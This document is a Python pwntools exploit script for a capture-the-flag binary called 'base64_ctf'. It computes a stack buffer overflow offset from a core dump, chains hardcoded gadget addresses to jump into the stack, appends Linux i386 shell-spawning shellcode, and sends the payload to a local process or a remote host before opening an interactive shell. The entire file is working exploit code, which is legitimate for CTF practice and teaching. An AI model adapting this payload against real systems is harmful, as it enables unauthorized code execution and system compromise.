#!/usr/bin/env python

# THIS CODE MUST BE RUN ON THE VPS!!

from pwn import *
import re

context.binary = './base64_ctf'

REMOTE = False
host = "localhost"
port = 4444

# --- calculate the offset
if REMOTE == False:
	elf = context.binary

	p = elf.process()
	p.sendline(cyclic(200))
	p.wait()

	core = p.corefile

	offset = cyclic_find(core.eip, n=4)
	info("the offset is %d", offset)

else:
	# write the offset manually if you are executing it remotely
	offset = 48
# ----------------------------

# --- exploit the program ---
exe = context.binary

# set the addresses
mov_eax_esp_pop_ebp = 0x080491ef
positions_to_add = 0x20
add_eax_ebp = 0x08049213
jmp_eax = 0x08049201

# merge all
payload = [
	b'A' * offset,
	p32(mov_eax_esp_pop_ebp),
	p32(positions_to_add),
	p32(add_eax_ebp),
	p32(jmp_eax),
	b'C' * 50,
	asm(shellcraft.i386.linux.sh())
]

payload = b"".join(payload)

print(payload)
with open('payload', 'wb') as file:
	file.write(payload)



if REMOTE:
	r = remote(host, port)
else:
	r = exe.process()

r.recvuntil(b"\n")
r.sendline(payload)

r.interactive()

